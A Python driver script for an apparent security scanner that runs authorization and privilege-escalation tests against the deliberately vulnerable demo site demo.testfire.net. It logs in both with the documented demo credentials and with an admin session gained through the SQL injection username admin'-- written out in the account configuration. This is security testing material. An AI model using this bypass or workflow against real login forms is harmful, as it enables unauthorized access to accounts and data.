#!/usr/bin/env python3
"""SENTINEL v2.8.0 — LIVE Multi-User Authorization battery on demo.testfire.net.

Light production strategy (per user directive): do NOT re-fire the full active
battery (~672 requests) at the shared demo target; instead replay the REAL
production discovery set from the completed live scan (run-9951adb4de, 37
endpoints from the coverage ledger) through the production AuthzEngine with
two REAL sessions:

  * jsmith / demo1234   (role=user)  — the documented demo account
  * admin'-- / x        (role=admin) — session obtained through the
    SENTINEL-VERIFIED SQL injection on the login form (post-exploitation use
    of an already-proven finding on a deliberately vulnerable public demo;
    the account name says exactly how the session was obtained).

Manually probed expectations (doctrine: feasibility BEFORE the run):
  * vertical_privilege_escalation on /admin/admin.jsp — anonymous is
    redirected to login (gated), admin gets 200, and the regular USER also
    gets 200 WITH the privileged body (the user-management table).
  * IDOR via the `account` parameter — honest negative: the current
    deployment's showAccount ignores the parameter entirely.

Parameter signatures for the ID-param endpoints (account=) are re-attached
from the scan's own findings/param-intel (the coverage ledger stores
method+url only). The run is deterministic, GET-only, logout-safe, and
budget-capped (max_role_view=20/role, max_vertical=5, idor 8/12).
"""
import json
import os
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)) or ".")

from sentinel.authz import AuthzConfig, AuthzEngine
from sentinel.core import Endpoint, EventBus, Parameter, ParamLocation, ScopeRule
from sentinel.evidence import assess as assess_impact

ROOT = os.path.dirname(os.path.abspath(__file__))
TARGET = "http://demo.testfire.net/"
LIVE_SCAN = os.path.join(ROOT, "results", "scan_testfire_v280_LIVE.json")
OUT = os.path.join(ROOT, "results", "scan_testfire_v280_AUTHZ.json")

# param signatures re-attached from the scan's findings/param-intel
SIGNATURES = {
    "/bank/showAccount": [("account", "800002")],
    "/bank/showTransactions": [("account", "800002")],
}


def load_endpoints():
    d = json.load(open(LIVE_SCAN))
    recs = d["stats"]["coverage"]["endpoints"]
    seen, eps = set(), []
    for r in recs:
        key = (r["method"], r["url"])
        if key in seen:
            continue
        seen.add(key)
        params = []
        for name, val in SIGNATURES.get(r["url"].split(TARGET)[-1], []):
            params.append(Parameter(name, ParamLocation.QUERY, val).classify())
        eps.append(Endpoint(url=r["url"], method=r["method"], parameters=params))
    return eps, d["run_id"]


def main():
    endpoints, source_run = load_endpoints()
    cfg = AuthzConfig.from_dict({
        "login_url": "http://demo.testfire.net/login.jsp",
        "user_field": "uid",
        "pass_field": "passw",
        "success_marker": "Sign Off",
        "login_marker": "login",
        "max_vertical": 5,
        "max_idor_endpoints": 8,
        "max_idor_probes": 12,
        "max_role_view": 20,
        "accounts": [
            {"name": "jsmith-user", "role": "user", "username": "jsmith",
             "password": "demo1234", "marker": "John Smith", "object_id": "800002"},
            {"name": "sqli-admin-bypass", "role": "admin", "username": "admin'--",
             "password": "x", "marker": "Admin User", "object_id": "800000"},
        ],
    }, TARGET)
    scope = ScopeRule(allowed_domains=["demo.testfire.net"])
    bus = EventBus("authz-live")
    eng = AuthzEngine(cfg, scope, bus, timeout=25.0)
    t0 = time.time()
    out = eng.run(endpoints)
    wall = round(time.time() - t0, 1)

    findings = []
    for f in out["findings"]:
        fd = f.to_dict()
        fd["impact"] = assess_impact(f)
        findings.append(fd)

    report = {
        "target": TARGET,
        "engine": "sentinel-authz/2.8.0",
        "mode": "live-multi-user",
        "source_discovery_run": source_run,
        "source_note": ("endpoint set replayed from the completed production "
                        "live scan's coverage ledger (light-strategy directive)"),
        "accounts": [{"name": a.name, "role": a.role,
                      "session": "sql-injection bypass (admin'--)" if "sqli" in a.name
                      else "documented credentials"}
                     for a in cfg.accounts],
        "wall_s": wall,
        "stats": out["stats"],
        "matrix": out["matrix"],
        "findings": findings,
        "rejected": [f for f in findings if f["status"] != "verified"],
    }
    with open(OUT, "w") as fh:
        json.dump(report, fh, indent=1)

    st = out["stats"]
    print(f"accounts logged in: {st['accounts_logged_in']}/{st['accounts_configured']}"
          f" roles={st['roles']} ran={st['ran']} requests={st['requests']} wall={wall}s")
    if st["login_errors"]:
        for e in st["login_errors"]:
            print("  login error:", e)
    print(f"matrix endpoints: {st['matrix_endpoints']}")
    for f in findings:
        v = f["verification"]
        print(f"  [{f['status'].upper():8s}] {f['type']} {f['url']} param={f['parameter']}"
              f" | VR={v['method']} passed={v['passed']}")
        print(f"            impact: {f['impact']['grade']} — {f['impact']['statement'][:100]}")
    if not findings:
        print("  (no findings — see matrix and stats for the honest account)")
    print("->", OUT)


if __name__ == "__main__":
    main()
